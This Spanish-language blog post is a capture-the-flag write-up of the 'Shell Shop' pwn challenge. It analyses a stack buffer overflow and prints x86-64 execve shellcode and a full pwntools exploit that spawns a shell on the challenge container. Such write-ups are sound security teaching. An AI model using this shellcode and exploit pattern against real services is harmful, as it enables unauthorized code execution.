@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  
+    <title>shell_shop :: Hackers Fight Club Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Bugcrowd Student Qualifier | Shell Shop Writeup Descripción Categoría: Pwn &gt; Dificultad: Media
+Para este reto, se nos brindó un comprimido pwn_shellstore.zip del ejecutable principal shell_shop, acompañado de las librerías necesarias en un directorio glibc. La idea es analizar estos recursos para preparar un exploit contra este binario como servicio, en un contenedor docker que desplegaba la página del CTF.
+En cuanto al ejecutable, este despliega un menú básico para la compra de un par de productos fantasiosos y una opción para terminar el programa, no sin antes preguntar si deseas ser notificado cuando la tienda reaparezca.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://albertnath.github.io/hfc-blog/posts/shell_shop/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/code.min.4f0ccc8439f99bf7f7970298556b94011aabc1fcae743b6842fc3361a2da9ea3.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/main.min.61ebeff97afe3635753dcda5e0c7a822cb4d2ca9a4e662b6736ffb5a39b2f99a.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="https://albertnath.github.io/hfc-blog/favicon.png">
+<link rel="apple-touch-icon" href="https://albertnath.github.io/hfc-blog/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="Ookami" />
+
+
+
+<meta property="og:locale" content="es" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="shell_shop">
+<meta property="og:description" content="Bugcrowd Student Qualifier | Shell Shop Writeup Descripción Categoría: Pwn &gt; Dificultad: Media
+Para este reto, se nos brindó un comprimido pwn_shellstore.zip del ejecutable principal shell_shop, acompañado de las librerías necesarias en un directorio glibc. La idea es analizar estos recursos para preparar un exploit contra este binario como servicio, en un contenedor docker que desplegaba la página del CTF.
+En cuanto al ejecutable, este despliega un menú básico para la compra de un par de productos fantasiosos y una opción para terminar el programa, no sin antes preguntar si deseas ser notificado cuando la tienda reaparezca.
+" />
+<meta property="og:url" content="https://albertnath.github.io/hfc-blog/posts/shell_shop/" />
+<meta property="og:site_name" content="Hackers Fight Club Blog" />
+
+  <meta property="og:image" content="https://albertnath.github.io/hfc-blog/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-06-06 09:12:48 -0600 CST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://albertnath.github.io/hfc-blog/">
+  <div class="logo">
+    Hackers Fight Club Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/acerca-de">Acerca De</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/authors">Autores</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/tags">Categorías</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/posts">Posts</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/acerca-de" >Acerca De</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/authors" >Autores</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/tags" >Categorías</a></li>
+        
+      
+        
+          <li><a href="https://albertnath.github.io/hfc-blog/posts" >Posts</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://albertnath.github.io/hfc-blog/posts/shell_shop/">shell_shop</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">06-06-2025</time><span class="post-author">Ookami</span><span class="post-reading-time">7 min. de lectura (1340 palabras)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://albertnath.github.io/hfc-blog/tags/writeup/">Writeup</a>&nbsp;
+      
+      #<a href="https://albertnath.github.io/hfc-blog/tags/red-team/">Red Team</a>&nbsp;
+      
+      #<a href="https://albertnath.github.io/hfc-blog/tags/pwning/">Pwning</a>&nbsp;
+      
+      #<a href="https://albertnath.github.io/hfc-blog/tags/reversing/">Reversing</a>&nbsp;
+      
+      #<a href="https://albertnath.github.io/hfc-blog/tags/linux/">Linux</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="bugcrowd-student-qualifier--shell-shop-writeup">Bugcrowd Student Qualifier | Shell Shop Writeup<a href="#bugcrowd-student-qualifier--shell-shop-writeup" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<!-- raw HTML omitted -->
+<h2 id="descripción">Descripción<a href="#descripción" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<blockquote>
+<p><strong>Categoría</strong>: <em>Pwn</em> &gt; <strong>Dificultad</strong>: Media</p></blockquote>
+<p>Para este reto, se nos brindó un <strong>comprimido</strong> <code>pwn_shellstore.zip</code> del <strong>ejecutable principal</strong> <code>shell_shop</code>, acompañado de las librerías necesarias en un directorio <code>glibc</code>.
+La idea es analizar estos recursos para preparar un <code>exploit</code> contra este binario como servicio, en un contenedor <code>docker</code> que desplegaba la página del <em>CTF</em>.</p>
+<p>En cuanto al <strong>ejecutable</strong>, este despliega un menú básico para la compra de un par de productos fantasiosos y una opción para terminar el programa, no sin antes preguntar si deseas ser notificado cuando la tienda reaparezca.</p>
+
+<img src="https://albertnath.github.io/hfc-blog/img/shell_shop/bugcrowd2_pwn_shellStore.png"  alt="bugcrowd2_pwn_shellStore.png"  class="center"    />
+
+
+<h2 id="análisis">Análisis<a href="#análisis" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h4 id="manual">Manual<a href="#manual" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>Antes de profundizar en el <strong>análisis</strong>, me dispuse a interactuar y probar a mano las distintas opciones en el menú del programa.</p>
+<p>Particularmente, hubo un comportamiento que llamó mi atención. Con el saldo inicial de <strong>1337</strong> monedas, únicamente se puede comprar el objeto <code>X0 Armor</code>.
+Tras comprar este objeto y optar por salir de la tienda, el programa nos ofrece un <strong>&ldquo;código de descuento&rdquo;</strong> distinto en cada ejecución:</p>
+
+<img src="https://albertnath.github.io/hfc-blog/img/shell_shop/bugcrowd2025_pwnShellStore_discount.png"  alt="bugcrowd2025_pwnShellStore_discount.png"  class="center"    />
+
+
+<p>Este <em>&ldquo;código&rdquo;</em> parece más una <code>dirección de memoria</code>, por el formato <code>hexadecimal</code>.
+Además, el hecho de que siempre inicie con los dígitos <code>7f</code> sugiere que se trata de una dirección en la sección de la <code>pila</code> en memoria.</p>
+<h4 id="checksec">Checksec<a href="#checksec" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>Por otra parte, utilicé la herramienta <a href="https://github.com/slimm609/checksec">checksec</a> para identificar medidas de seguridad activas en el <code>binario</code>.</p>
+<p>En especial, nos interesan los mecanismos más importantes que son:</p>
+<ul>
+<li>
+<p><code>Stack Canary</code>: Detección de <strong>corrupción de datos</strong> de la <code>pila</code>.</p>
+</li>
+<li>
+<p><code>NX</code>: Bloqueo de <strong>ejecución</strong> de código en la <code>pila</code>.</p>
+</li>
+<li>
+<p><code>PIE</code>: Aleatorización de las <code>direcciones de memoria</code> del ejecutable.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>checksec --file<span style="color:#f92672">=</span>shell_shop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># RELRO           STACK CANARY      NX            PIE              &lt;--REDACTED--&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Full RELRO      No canary found   NX disabled   PIE enabled      &lt;--REDACTED--&gt;</span>
+</span></span></code></pre></div><p>Por los resultados, notamos que <code>Stack Canary</code> y <code>NX</code> estan <strong>desactivados</strong>, lo que quiere decir que el <code>binario</code> <strong>podría</strong> ser susceptible a ataques de tipo <code>Buffer Overflow</code>.</p>
+<p>Sin embargo, <code>PIE</code> sí se encuentra <strong>activo</strong> lo que hace impredecible las <code>direcciones de memoria</code>, dificultando en cierta medida la <code>explotación</code>.</p>
+<h4 id="análisis-avanzado">Análisis avanzado<a href="#análisis-avanzado" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>Para un <strong>análisis</strong> más <strong>avanzado</strong> del <code>binario</code>, utilicé principalmente <a href="https://github.com/radareorg/radare2">Radare2</a> con el <em>plugin</em> <a href="https://github.com/radareorg/r2ghidra">R2Ghidra</a> y el <code>depurador</code> <strong>GDB</strong> acompañado de la extensión <a href="https://github.com/pwndbg/pwndbg">PwnDBG</a>.</p>
+<h6 id="decompilado-y-desensamblado">Decompilado y desensamblado<a href="#decompilado-y-desensamblado" class="hanchor" ariaLabel="Anchor">#</a> </h6>
+<p>Para empezar, obtuve y revisé el <code>desensamblado</code> y <code>decompilado</code> de varias <code>funciones</code> del <code>binario</code> con <code>radare2</code>.
+Mi objetivo era identificar cualquier <code>vulnerabilidad</code> en el código y esclarecer el comportamiento del código de descuento.</p>
+<p>Tras un tiempo, encontré esta sección interesante del código <code>decompilado</code> de la <code>función</code> <em>main</em> que responde ambas interrogantes:</p>
+
+<img src="https://albertnath.github.io/hfc-blog/img/shell_shop/bugcrowd2025_pwn_vulns.png"  alt="bugcrowd2025_pwn_vulns.png"  class="center"    />
+
+
+<p>Para el código de descuento, podemos ver que imprime la dirección <code>&amp;stack0xffffffffffffffc8</code> en formato de <code>apuntador</code> (<code>%p</code>).</p>
+<p>Esta sintaxis de <strong>Ghidra</strong> se refiere a un desplazamiento de <code>0xffffffffffffffc8</code>, que representa <code>-56</code> en el sistema decimal, de una dirección base <code>&amp;stack</code> relacionada a una sección de la <code>pila</code> de esta función.
+Así confirmamos que el código de descuento es una dirección <strong>específica</strong> de la <code>pila</code>.</p>
+<p>Después, hay una <code>vulnerabilidad</code> cuando se pregunta al usuario si desea ser notificado, debido a 2 razones:</p>
+<ol>
+<li>El programa escribe la respuesta <strong>directamente</strong> en la <code>pila</code>, en la dirección <code>&amp;stack0xffffffffffffffc6</code>.</li>
+<li>Aunque solo se requiere un caracter en la respuesta, se le indicó a la <code>función</code> <em>fgets</em> recibir hasta 100 caracteres.</li>
+</ol>
+<p>Esto abre completamente la posibilidad a un ataque de <code>Buffer Overflow</code> si logramos sobreescribir la <code>dirección de retorno</code> almacenada en la <code>pila</code>, y redirigir el flujo de ejecución a la misma <code>pila</code>.</p>
+<p>Pero primero, dada la restricción del <code>PIE</code>, debemos determinar una <code>dirección de retorno</code> específica a la sección de la <code>pila</code> que podemos sobreescribir.</p>
+<p>Antes se mencionó que el programa escribe nuestra respuesta en <code>&amp;stack0xffffffffffffffc6</code> que, bajo la misma sintaxis del ejemplo anterior, representa la dirección <code>&amp;stack</code> con un desplazamiento de <code>-58</code>.
+Es decir, 2 <code>bytes</code> antes que cualquier dirección otorgada como código de descuento!</p>
+<p>O sea que, a pesar de la <strong>aleatorización</strong> de las direcciones, siempre sabremos que la dirección filtrada como código de descuento se ubica 2 <code>bytes</code> después de donde se comienza a almacenar nuestra respuesta.</p>
+<p>Finalmente, solo resta determinar si podemos sobreescribir la <code>dirección de retorno</code> de esta <code>función</code>, y en caso afirmativo, identificar el <code>offset</code> necesario para sobreescribirla.</p>
+<h6 id="depuración">Depuración<a href="#depuración" class="hanchor" ariaLabel="Anchor">#</a> </h6>
+<p>Para esta tarea, me apoyé de <strong>PwnDBG</strong>, primero generando una <code>cadena de patrón cíclico</code> con una longitud adecuada mediante el comando:</p>
+<pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; cyclic 99
+</code></pre><p>Después copié esta cadena y ejecuté el <code>binario</code> con el siguiente comando:</p>
+<pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; run
+</code></pre><p>Tras solicitar terminar el programa, introduje dicha cadena como respuesta a si deseo ser notificado, obteniendo un error de <em>Segmentation Fault</em>.</p>
+<pre tabindex="0"><code class="language-gdb" data-lang="gdb">&gt;&gt; 3
+
+Do you want to get notified when the Virtual Shell Shop appears again? (y/n): aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaa
+
+Some events and shops appear randomly, good luck!
+
+
+Program received signal SIGSEGV, Segmentation fault.
+</code></pre><p>Esto siempre es buena señal, y con apoyo del <code>depurador</code> confirmé que es debido a la corrupción de la <code>dirección de retorno</code>, pues el programa intentó retornar a una dirección inexistente:</p>
+<pre tabindex="0"><code class="language-gdb" data-lang="gdb">&gt; 0x555555555603 &lt;main+372&gt;  ret         &lt;0x6169616161616161&gt;
+</code></pre><p>Esta dirección inexistente, es en realidad un fragmento de nuestra <code>cadena de patrón cíclico</code>, entonces, confirmamos que es posible sobreescribir la <code>dirección de retorno</code> y podemos obtener el <code>offset</code> mediante el siguiente comando en <strong>PwnDBG</strong>:</p>
+<pre tabindex="0"><code class="language-gdb" data-lang="gdb">pwndbg&gt; cyclic -l 0x6169616161616161
+
+Finding cyclic pattern of 8 bytes: b&#39;aaaaaaia&#39; (hex: 0x6161616161616961)
+Found at offset 58
+</code></pre><h6 id="conclusiones">Conclusiones<a href="#conclusiones" class="hanchor" ariaLabel="Anchor">#</a> </h6>
+<p>Tras todo el análisis, repasemos la información que recopilamos de este <code>binario</code> y que será clave para el desarrollo del <code>exploit</code>:</p>
+<ul>
+<li>Se aleatorizan las <code>direcciones de memoria</code>, pero no hay ningun mecanismo de protección en la <code>pila</code>.</li>
+<li>Filtra una <code>dirección de memoria</code> específica.</li>
+<li>Es susceptible a <code>Buffer Overflow</code> cuando pregunta si deseas ser notificado.</li>
+<li>La respuesta a esta pregunta comienza su escritura 2 <code>bytes</code> antes de la dirección filtrada.</li>
+<li>Tras los primeros 58 <code>bytes</code> escritos, los siguientes sobreescriben la <code>dirección de retorno</code> de la <code>función</code> <em>main</em>.</li>
+</ul>
+<h2 id="explotación">Explotación<a href="#explotación" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Antes que nada, busqué un <code>Shellcode</code> adecuado en la página web <a href="https://shell-storm.org/shellcode/index.html">Shell Storm</a>, para la arquitectura <code>x86-64</code> y plataforma <code>Linux</code></p>
+<p>Opté por el <code>Shellcode</code> <a href="https://shell-storm.org/shellcode/files/shellcode-909.html"><code>execve(&quot;/bin/bash&quot;,{NULL},{NULL}) - 24 bytes</code></a> que simplemente ejecuta una <code>línea de comandos</code>, especificamente <code>bash</code>.
+El código en <code>ensamblador</code> de la página es el siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> rax, <span style="color:#ae81ff">0x68732f6e69622f</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> rax
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> rsp
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pop</span> rdi
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xor</span> eax, eax
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> rax
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> al, <span style="color:#ae81ff">59</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> rsp
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pop</span> rdx
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">push</span> rsp
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pop</span> rsi
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
+</span></span></code></pre></div><p>Con apoyo de un <a href="https://defuse.ca/online-x86-assembler.htm">ensamblador en línea</a>, <strong>ensamblé</strong> este código para la arquitectura <code>x64</code>, verificando así su integridad y compatibilidad.</p>
+<p>En consecuencia, la página te brinda varias representaciones del <code>código ensamblado</code>, pero la más útil para este ejercicio es <em>String Literal</em>, que es la siguiente cadena:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x54\x5F\x31\xC0\x50\xB0\x3B\x54\x5A\x54\x5E\x0F\x05</span><span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>Así, podemos incorporar directamente esta cadena en el <code>exploit</code> sin más problemas.</p>
+<p>Decidí desarrollar el <code>exploit</code> en <code>Python</code>, en conjunto con la librería <a href="https://github.com/Gallopsled/pwntools"><em>Pwntools</em></a> que facilita este proceso. El <code>exploit</code> se ve de la siguiente manera:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ookami</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hackers Fight Club</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ------------------</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> remote,p64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SHELLCODE <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x54\x5F\x31\xC0\x50\xB0\x3B\x54\x5A\x54\x5E\x0F\x05</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>docker <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;172.17.0.2:8080&#39;</span>
+</span></span><span style="display:flex;"><span>host, port <span style="color:#f92672">=</span> docker<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(host, int(port))
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;[&#39;</span>)
+</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">14</span>)<span style="color:#f92672">.</span>decode(),<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;(y/n): &#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;AA&#39;</span><span style="color:#f92672">+</span>SHELLCODE<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span><span style="color:#f92672">+</span>p64(addr)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">52</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>La mayor parte de este, es establecer la conexión con el <code>servidor:puerto</code> indicados, simular la interacción con el <strong>menú</strong> para comprar el objeto y capturar la dirección filtrada.
+Sabiendo que la dirección siempre mide 14 caracteres (o <code>bytes</code>) y se encuentra entre corchetes, no es dificil utilizar las funciones <code>recvuntil</code> y <code>recv</code> implementadas por <code>pwntools</code> para realizarlo y convertirla a un entero.</p>
+<p>Por otra parte, la creación del <code>payload</code> principal fue de la siguiente manera:</p>
+<ol>
+<li><strong>2</strong> caracteres basura por la diferencia con la dirección filtrada.</li>
+<li>Cadena de <code>bytes</code> del <code>Shellcode</code> seleccionado de <strong>24</strong> <code>bytes</code>.</li>
+<li><strong>32</strong> caracteres basura necesarios para completar el <code>offset</code> necesario de <strong>58</strong>.</li>
+<li><code>Dirección de retorno</code> en formato <code>Little-Endian</code>, de lo que se encarga la función <code>p64</code>. Es decir, por poner un ejemplo, convierte un entero <code>0x7fffa2aecf60</code> a una cadena de <code>bytes</code>: <code>b'\x60\xcf\xae\xa2\xff\x7f\x00\x00'</code>.</li>
+</ol>
+<p>Finalmente, tras enviar este <code>payload</code> y recibir la despedida del programa, volvemos interactivo el programa para simular una <code>línea de comandos</code>.</p>
+
+<img src="https://albertnath.github.io/hfc-blog/img/shell_shop/bugcrowd2025_pwn_shell.png"  alt="bugcrowd2025_pwn_shell.png"  class="center"    />
+
+
+<p>Después, podremos leer la bandera normalmente con un comando <code>cat</code> en esta <code>shell</code> improvisada.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat flag.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># HTB{&lt;--REDACTED--&gt;}</span>
+</span></span></code></pre></div><h2 id="recursos-de-apoyo">Recursos de apoyo<a href="#recursos-de-apoyo" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li><strong>Radare2 Cheatsheet</strong> - <a href="https://github.com/radareorg/radare2/blob/master/doc/intro.md">https://github.com/radareorg/radare2/blob/master/doc/intro.md</a></li>
+<li><strong>GDB Cheatsheet</strong> - <a href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf">https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf</a></li>
+<li><strong>PwnDBG Cheatsheet</strong> - <a href="https://pwndbg.re/CheatSheet.pdf">https://pwndbg.re/CheatSheet.pdf</a></li>
+<li><strong>Mastering Pwntools</strong> - <a href="https://medium.com/@kuldeepkumawat195/mastering-pwntools-a-python-library-for-ctf-challenges-and-exploit-development-8547668c861c">https://medium.com/@kuldeepkumawat195/mastering-pwntools-a-python-library-for-ctf-challenges-and-exploit-development-8547668c861c</a></li>
+</ul>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Más posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="https://albertnath.github.io/hfc-blog/posts/nahamcon_ctf_2025_infinite_queue/" class="button inline prev">
+        &lt; [<span class="button__text">NahamCon CTF 2025 | Infinite Queue</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="https://albertnath.github.io/hfc-blog/posts/htb_cyber_apocalypse_2025_cyberattack/" class="button inline next">
+         [<span class="button__text">HTB Cyber Apocalypse 2025 | CyberAttack WriteUp</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="https://albertnath.github.io/hfc-blog/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
